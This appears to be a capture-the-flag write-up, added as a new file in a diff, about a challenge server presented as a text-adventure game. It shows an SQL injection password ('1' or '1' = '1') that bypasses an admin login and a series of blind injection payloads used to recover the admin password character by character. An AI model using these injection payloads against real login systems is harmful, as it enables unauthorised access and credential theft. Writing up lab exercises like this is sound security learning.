@@ -1,0 +1,67 @@
+After logging into the server using any username and the 'murphy'
+password (wicked security model), you are presented with a
+text-adventure style game:
+
+| You are standing in front of a desk in a quiet, windowless office.
+| 
+| There are posters on the walls. The office door is closed. There is
+| a faint smell of tuna.
+| 
+|      -> look desk
+| A large wooden desk sits in the centre of the room. It's
+| imposing: you could imagine sitting begin it, stroking your feline
+| companion as you plot world domination.
+| 
+| Unfortunately, there's no chair. There is however a rubbish bin and
+| a shredder tucked under the desk, you didn't see them before.
+| 
+| There is a folder of documents on the desk.
+
+Attempting to pick up the folder gives a message to the effect of
+"It's stuck, maybe an admin could do that for you" (sorry blinken I
+don't remember your precise words, I'm sure they were more poetic).
+
+Sure enough if you try and login to the server with the username
+'admin', the 'murphy' password no longer works.
+
+blinken gave some hints about the admin password:
+a) it wasn't necessary to know the actual password to login
+b) the password was stored in a database
+
+The two combined suggested sql injection, which is exactly what worked:
+
+| Connecting...
+| WeLcOmE to NSA Telepresence
+| Remember, if you die in the game, you die in real life
+| 
+| Repeated authentication failures will result in deployment of tactical response.
+| 
+| Enter your username
+| admin
+| Enter your password
+| 1' or '1' = '1
+| 
+| Admin authorised: Dade "Flagtwo" Murphy
+| 
+| cipherchange:cipher=ARC4:keylen=14:charset=alpha
+| 
+| Welcome admin!
+
+
+== BONUS ROUND ==
+
+Obtaining the actual admin password was listed as a bonus objective.
+After guessing that the column being checked against was called
+"password", I used a series of injections to slowly determine each
+character. I didn't log my attempts, but it was along these lines:
+
+BAD:    1' or password > 'm'
+GOOD:   1' or password > 'f'
+BAD:    1' or password > 'i'
+GOOD:   1' or password > 'g'
+GOOD:   1' or password like 'h%'
+BAD:    1' or password > 'hm'
+BAD:    1' or password > 'hf'
+GOOD:   1' or password > 'hc'
+
+etc etc. if you want the actual password, do it yourself :P
